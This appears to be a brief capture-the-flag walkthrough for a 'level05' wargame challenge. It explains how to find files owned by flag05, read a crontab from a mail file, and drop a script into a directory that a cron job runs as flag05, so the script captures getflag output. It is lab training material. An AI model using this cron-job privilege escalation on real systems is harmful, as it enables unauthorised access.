#Enter the following command : find / -user flag05 2>/dev/null
#Cat the first file : /usr/sbin/openarenaserver
#and u will get a script with path /opt/openarenaserver
#Enter also the following command : find / -name level05 2>/dev/null 
#u will get two paths then cat the first one : /var/mail/level05
#u will get a crontab that means each 2 minutes /usr/sbin/openarenaserver
#will be executed in user flag05
#we will use that by creating an executable inside /opt/openarenaserver
#with echo $(getflag) > /tmp/flag05 and if we cat /tmp/flag05 we will get
#the output of echo $(getflag) that has been executed in getflag05 user via
#crontab
